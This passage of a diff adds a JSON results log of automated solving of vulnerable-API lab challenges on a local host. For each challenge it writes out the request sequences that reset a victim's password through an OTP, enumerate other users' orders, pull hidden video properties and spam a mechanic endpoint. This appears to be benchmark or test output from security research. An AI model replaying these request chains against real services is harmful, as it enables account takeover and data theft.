+            "snippet": "{\"carId\":\"7687261a-6e19-4bba-bec5-2f507036d7eb\",\"vehicleLocation\":{\"id\":1,\"latitude\":\"32.778889\",\"longitude\":\"-91.919243"
+          }
+        ],
+        "evidence": "{\"carId\":\"7687261a-6e19-4bba-bec5-2f507036d7eb\",\"vehicleLocation\":{\"id\":1,\"latitude\":\"32.778889\",\"longitude\":\"-91.919243\"},\"fullName\":\"Victim\",\"email\":\"victim-dd83e08f@example.com\"}"
+      },
+      {
+        "challenge": "ch2_bola_report",
+        "solved": true,
+        "requests": 6,
+        "seconds": 0.5,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-4c902221@example.com",
+              "number": "9000999686"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-4c902221@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tNGM5MDIyMjFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDQsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-7989f787@example.com",
+              "number": "9042362419"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-7989f787@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci03OTg5Zjc4N0BleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/identity/api/v2/vehicle/add_vehicle",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tNGM5MDIyMjFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDQsImV4cCI6MTc5MDgxNjkwNCwicm9sZSI6InVzZXIifQ.dNE_KyjJOFriDnPR9trUM-MakpgwykZpEye-jNaFcEXUsrhRpy7cWTBWrYEBLhpF_3VghSR69IhxRyrpC-PJdNYGP-PfZGe9eG1XKpQxhrfFqXU5_HyVbfgJTv_7iLAEaO-WKxTvvJpN4C-ZqZg9xpTbXpfWHMdBuUp3At8I4-GttgID77Dzrpz741kuaF4NnPRwkAVqI6fil61lsDBlbVCxBzZ-3XutdseHFM4Em4FVPRx4XfSAdIaqeGQZ_Sxy_8Lgu7EMfztIYwYln9zdGfQerxDKqt-hxkRvgpDnzZG1GGBhCdPqe8_ViNQPQpyeWK0RExPuRmEkzRx3FxxYLw",
+              "body": {
+                "vin": "F9N23T3HCZTJMU0T8",
+                "pincode": "5525"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"Vehicle save successfully..\",\"status\":200}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tNGM5MDIyMjFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDQsImV4cCI6MTc5MDgxNjkwNCwicm9sZSI6InVzZXIifQ.dNE_KyjJOFriDnPR9trUM-MakpgwykZpEye-jNaFcEXUsrhRpy7cWTBWrYEBLhpF_3VghSR69IhxRyrpC-PJdNYGP-PfZGe9eG1XKpQxhrfFqXU5_HyVbfgJTv_7iLAEaO-WKxTvvJpN4C-ZqZg9xpTbXpfWHMdBuUp3At8I4-GttgID77Dzrpz741kuaF4NnPRwkAVqI6fil61lsDBlbVCxBzZ-3XutdseHFM4Em4FVPRx4XfSAdIaqeGQZ_Sxy_8Lgu7EMfztIYwYln9zdGfQerxDKqt-hxkRvgpDnzZG1GGBhCdPqe8_ViNQPQpyeWK0RExPuRmEkzRx3FxxYLw",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "hi",
+                "vin": "F9N23T3HCZTJMU0T8",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":342,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          }
+        ],
+        "evidence": "{\"response_from_mechanic_api\":{\"id\":342,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=342\"},\"status\":200}"
+      },
+      {
+        "challenge": "ch3_password_reset",
+        "solved": true,
+        "requests": 7,
+        "seconds": 0.46,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-38811205@example.com",
+              "number": "9897714963"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-38811205@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tMzg4MTEyMDVAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDQsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-7d25befa@example.com",
+              "number": "9969353343"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-7d25befa@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci03ZDI1YmVmYUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/identity/api/auth/forget-password",
+              "token": "",
+              "body": {
+                "email": "victim-38811205@example.com"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"OTP Sent on the provided email, victim-38811205@example.com\",\"status\":200}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/identity/api/auth/v2/check-otp",
+              "token": "",
+              "body": {
+                "email": "victim-38811205@example.com",
+                "otp": "8827",
+                "password": "Hacked!123"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"OTP verified\",\"status\":200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-38811205@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tMzg4MTEyMDVAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDUsImV4cCI6MTc5MDgx"
+          }
+        ],
+        "evidence": "password reset for victim-38811205@example.com (login with new password OK)"
+      },
+      {
+        "challenge": "ch4_excessive_exposure",
+        "solved": true,
+        "requests": 7,
+        "seconds": 0.33,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-27c1a2db@example.com",
+              "number": "9684135140"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-27c1a2db@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/shop/orders/1",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkwODE2OTA1LCJyb2xlIjoidXNlciJ9.C-z9V1VwBdYh3KjtZQ5lm-zj2tVbRgXUdGO0BpUHzSkduDm0ZDbYrFEO0hOlmPRBw8AVNZp_bMIY1pPPx4UbCxIuxGDkT9rcuOjpxiPnRVb9aw8oIa3HIAevr141rHuozjd9xy9smyYRvIhfbcWA_5ROEnsu1axwg5ED-l1fySKveDV9h9LO2n2vjZvuP2fOqzqHCU6SX2TjS-AuA5cs1Vq21-Kdm9HSRcaw1QO3DoUYRervRHjo5ibSGiYb3vwGdarR9c1s13iqbGCd3jafqBi5bTYbUnPWe0EWvmo_xhcQX8PeXgl6ioY1KXEzmowXB-n72MoXeBSMN9Oxj3fpLw"
+            },
+            "status": 200,
+            "snippet": "{\"order\":{\"id\":1,\"user\":{\"email\":\"adam007@example.com\",\"number\":\"9876895423\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"1"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/shop/orders/2",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkwODE2OTA1LCJyb2xlIjoidXNlciJ9.C-z9V1VwBdYh3KjtZQ5lm-zj2tVbRgXUdGO0BpUHzSkduDm0ZDbYrFEO0hOlmPRBw8AVNZp_bMIY1pPPx4UbCxIuxGDkT9rcuOjpxiPnRVb9aw8oIa3HIAevr141rHuozjd9xy9smyYRvIhfbcWA_5ROEnsu1axwg5ED-l1fySKveDV9h9LO2n2vjZvuP2fOqzqHCU6SX2TjS-AuA5cs1Vq21-Kdm9HSRcaw1QO3DoUYRervRHjo5ibSGiYb3vwGdarR9c1s13iqbGCd3jafqBi5bTYbUnPWe0EWvmo_xhcQX8PeXgl6ioY1KXEzmowXB-n72MoXeBSMN9Oxj3fpLw"
+            },
+            "status": 200,
+            "snippet": "{\"order\":{\"id\":2,\"user\":{\"email\":\"pogba006@example.com\",\"number\":\"9876570006\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\""
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/shop/orders/3",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkwODE2OTA1LCJyb2xlIjoidXNlciJ9.C-z9V1VwBdYh3KjtZQ5lm-zj2tVbRgXUdGO0BpUHzSkduDm0ZDbYrFEO0hOlmPRBw8AVNZp_bMIY1pPPx4UbCxIuxGDkT9rcuOjpxiPnRVb9aw8oIa3HIAevr141rHuozjd9xy9smyYRvIhfbcWA_5ROEnsu1axwg5ED-l1fySKveDV9h9LO2n2vjZvuP2fOqzqHCU6SX2TjS-AuA5cs1Vq21-Kdm9HSRcaw1QO3DoUYRervRHjo5ibSGiYb3vwGdarR9c1s13iqbGCd3jafqBi5bTYbUnPWe0EWvmo_xhcQX8PeXgl6ioY1KXEzmowXB-n72MoXeBSMN9Oxj3fpLw"
+            },
+            "status": 200,
+            "snippet": "{\"order\":{\"id\":3,\"user\":{\"email\":\"robot001@example.com\",\"number\":\"9876570001\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\""
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/shop/orders/4",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkwODE2OTA1LCJyb2xlIjoidXNlciJ9.C-z9V1VwBdYh3KjtZQ5lm-zj2tVbRgXUdGO0BpUHzSkduDm0ZDbYrFEO0hOlmPRBw8AVNZp_bMIY1pPPx4UbCxIuxGDkT9rcuOjpxiPnRVb9aw8oIa3HIAevr141rHuozjd9xy9smyYRvIhfbcWA_5ROEnsu1axwg5ED-l1fySKveDV9h9LO2n2vjZvuP2fOqzqHCU6SX2TjS-AuA5cs1Vq21-Kdm9HSRcaw1QO3DoUYRervRHjo5ibSGiYb3vwGdarR9c1s13iqbGCd3jafqBi5bTYbUnPWe0EWvmo_xhcQX8PeXgl6ioY1KXEzmowXB-n72MoXeBSMN9Oxj3fpLw"
+            },
+            "status": 200,
+            "snippet": "{\"order\":{\"id\":4,\"user\":{\"email\":\"test@example.com\",\"number\":\"9876540001\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.0"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/workshop/api/shop/orders/5",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0yN2MxYTJkYkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNSwiZXhwIjoxNzkwODE2OTA1LCJyb2xlIjoidXNlciJ9.C-z9V1VwBdYh3KjtZQ5lm-zj2tVbRgXUdGO0BpUHzSkduDm0ZDbYrFEO0hOlmPRBw8AVNZp_bMIY1pPPx4UbCxIuxGDkT9rcuOjpxiPnRVb9aw8oIa3HIAevr141rHuozjd9xy9smyYRvIhfbcWA_5ROEnsu1axwg5ED-l1fySKveDV9h9LO2n2vjZvuP2fOqzqHCU6SX2TjS-AuA5cs1Vq21-Kdm9HSRcaw1QO3DoUYRervRHjo5ibSGiYb3vwGdarR9c1s13iqbGCd3jafqBi5bTYbUnPWe0EWvmo_xhcQX8PeXgl6ioY1KXEzmowXB-n72MoXeBSMN9Oxj3fpLw"
+            },
+            "status": 200,
+            "snippet": "{\"order\":{\"id\":5,\"user\":{\"email\":\"admin@example.com\",\"number\":\"9010203040\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10."
+          }
+        ],
+        "evidence": "{\"order\":{\"id\":5,\"user\":{\"email\":\"admin@example.com\",\"number\":\"9010203040\"},\"product\":{\"id\":1,\"name\":\"Seat\",\"price\":\"10.00\",\"image_url\":\"images/seat.svg\"},\"quantity\":2,\"status\":\"delivered\",\"transaction_id\":\"3c38cb14-be3e-49bc-8d3d-28d55bc960c9\",\"created_on\":\"2026-09-23T00:27:38.533905\"},\"payment\":{\""
+      },
+      {
+        "challenge": "ch5_video_internal_prop",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.37,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-236da502@example.com",
+              "number": "9365798229"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-236da502@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tMjM2ZGE1MDJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDUsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "upload_video",
+            "status": 200,
+            "snippet": "69"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "GET",
+              "path": "/identity/api/v2/user/videos/69",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tMjM2ZGE1MDJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDUsImV4cCI6MTc5MDgxNjkwNSwicm9sZSI6InVzZXIifQ.a1VGIpZI8OjlNtcAnkZOavCoZ6OabQ-clHZfdr5g3ObwdPV4fc43gIJ3MsedvRU2H2fzvmaA-68HdvYJnGhd5eQjgWyVfh-cLbqaR_n16T28PF_xGJrxBeefF3gumXiUKEXm0EKSWjTm-0RjTb9of-T6EhJjmfcB5jCALTu7CFDMCIQuUBusLd3smQ6EC2xruGwblGaLnsBThzVJRByKttA1ZRG8w1COUi0Omg-yLhtbenuhousYLp8meIdYkbipQG-fXeNqU1iaODPjgS1xiAazhzXWCUbB63wDiZKU_VbCnJbYZ3fJePiTZToJo2Utx_AY1gKwI4VXy56gJ-IP_Q"
+            },
+            "status": 200,
+            "snippet": "{\"id\":69,\"video_name\":\"x.mp4\",\"conversion_params\":\"-v codec h264\",\"profileVideo\":\"data:image/jpeg;base64,ZHVtbXk=\"}"
+          }
+        ],
+        "evidence": "{\"id\":69,\"video_name\":\"x.mp4\",\"conversion_params\":\"-v codec h264\",\"profileVideo\":\"data:image/jpeg;base64,ZHVtbXk=\"}"
+      },
+      {
+        "challenge": "ch6_rate_limit",
+        "solved": true,
+        "requests": 18,
+        "seconds": 1.32,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-dc5fa992@example.com",
+              "number": "9702790403"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-dc5fa992@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/identity/api/v2/vehicle/add_vehicle",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "vin": "29H4950666068889U",
+                "pincode": "4737"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"Vehicle save successfully..\",\"status\":200}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":343,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":344,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":345,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":346,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":347,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":348,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":349,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
